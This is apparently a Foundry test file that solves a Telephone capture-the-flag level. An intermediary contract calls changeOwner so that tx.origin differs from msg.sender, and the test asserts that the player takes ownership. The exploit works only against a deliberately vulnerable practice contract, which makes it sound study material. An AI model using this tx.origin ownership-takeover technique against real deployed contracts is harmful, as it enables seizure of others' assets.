// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Telephone} from "src/levels/Telephone.sol";
import {TelephoneFactory} from "src/levels/TelephoneFactory.sol";

contract TelephoneAttack {
    function attack(address target, address newOwner) external {
        Telephone(target).changeOwner(newOwner);
    }
}

contract TelephoneSolve is Test {
    TelephoneFactory factory;
    Telephone instance;
    TelephoneAttack attacker;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new TelephoneFactory();
        instance = Telephone(factory.createInstance(player));
        attacker = new TelephoneAttack();
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        vm.startPrank(player);
        // changeOwner mengizinkan bila tx.origin != msg.sender — panggil lewat
        // kontrak perantara sehingga msg.sender = kontrak, tx.origin = player.
        attacker.attack(address(instance), player);
        vm.stopPrank();
        assertEq(instance.owner(), player);
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
